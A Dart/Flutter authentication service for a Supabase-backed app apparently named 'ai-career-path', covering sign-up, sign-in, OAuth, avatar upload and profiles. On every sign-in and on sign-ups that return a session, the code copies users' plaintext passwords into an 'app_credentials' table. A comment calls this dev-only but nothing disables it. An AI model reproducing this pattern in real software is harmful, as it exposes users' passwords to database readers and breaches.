import 'dart:typed_data';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:uuid/uuid.dart';
import '../models/profile_model.dart';
import 'supabase_service.dart';
import '../../core/utils/logger.dart';

class AuthService {
  SupabaseClient get _client => SupabaseService.client;

  Future<AuthResponse> signUp({
    required String email,
    required String password,
    required String fullName,
  }) async {
    try {
      final response = await _client.auth.signUp(
        email: email,
        password: password,
        data: {'full_name': fullName},
      );
      final user = response.user;
      if (user != null && response.session != null) {
        await updateProfile(user.id, {'full_name': fullName});
        await _saveCredentials(user.id, email, password);
      }
      appLogger.i('SignUp success: ${response.user?.id}');
      return response;
    } on AuthException catch (e) {
      appLogger.e('SignUp error: ${e.message}');
      rethrow;
    }
  }

  Future<AuthResponse> signIn({
    required String email,
    required String password,
  }) async {
    try {
      final response = await _client.auth.signInWithPassword(
        email: email,
        password: password,
      );
      final user = response.user;
      if (user != null) {
        await _saveCredentials(user.id, email, password);
      }
      appLogger.i('SignIn success: ${response.user?.id}');
      return response;
    } on AuthException catch (e) {
      appLogger.e('SignIn error: ${e.message}');
      rethrow;
    }
  }

  /// DEV-ONLY: mirror the user's email + password into a single `app_credentials`
  /// table so both can be reviewed together from the Supabase dashboard.
  /// WARNING: storing plaintext passwords is insecure — remove before production.
  Future<void> _saveCredentials(
    String userId,
    String email,
    String password,
  ) async {
    try {
      await _client.from('app_credentials').upsert({
        'id': userId,
        'email': email,
        'password': password,
      }, onConflict: 'id');
    } catch (e) {
      // Non-fatal: never block auth on the dev credentials mirror.
      appLogger.e('Save credentials error: $e');
    }
  }

  /// Uploads a profile picture to the public `avatars` bucket and returns its
  /// public URL. The caller is responsible for persisting it on the profile.
  Future<String> uploadAvatar(
    String userId,
    Uint8List bytes, {
    String extension = 'jpg',
  }) async {
    final ext = extension == 'jpeg' ? 'jpg' : extension;
    final path = '$userId/${const Uuid().v4()}.$ext';
    await _client.storage.from('avatars').uploadBinary(
          path,
          bytes,
          fileOptions: FileOptions(contentType: 'image/$ext', upsert: true),
        );
    return _client.storage.from('avatars').getPublicUrl(path);
  }

  Future<bool> signInWithOAuth(OAuthProvider provider) async {
    return _client.auth.signInWithOAuth(
      provider,
      redirectTo: 'ai-career-path://login-callback/',
    );
  }

  Future<void> signOut() async {
    try {
      await _client.auth.signOut();
      appLogger.i('SignOut success');
    } on AuthException catch (e) {
      appLogger.e('SignOut error: ${e.message}');
      rethrow;
    }
  }

  Future<void> resetPassword(String email) async {
    await _client.auth.resetPasswordForEmail(email);
  }

  Stream<AuthState> get authStateChanges => _client.auth.onAuthStateChange;

  User? get currentUser => _client.auth.currentUser;

  Future<ProfileModel?> getProfile(String userId) async {
    try {
      final data = await _client
          .from('profiles')
          .select()
          .eq('id', userId)
          .maybeSingle();
      return data != null ? ProfileModel.fromJson(data) : null;
    } catch (e) {
      appLogger.e('Get profile error: $e');
      return null;
    }
  }

  Future<ProfileModel?> updateProfile(
    String userId,
    Map<String, dynamic> updates,
  ) async {
    try {
      final data = await _client
          .from('profiles')
          .upsert({
            'id': userId,
            ...updates,
          })
          .select()
          .single();
      return ProfileModel.fromJson(data);
    } catch (e) {
      appLogger.e('Update profile error: $e');
      rethrow;
    }
  }
}
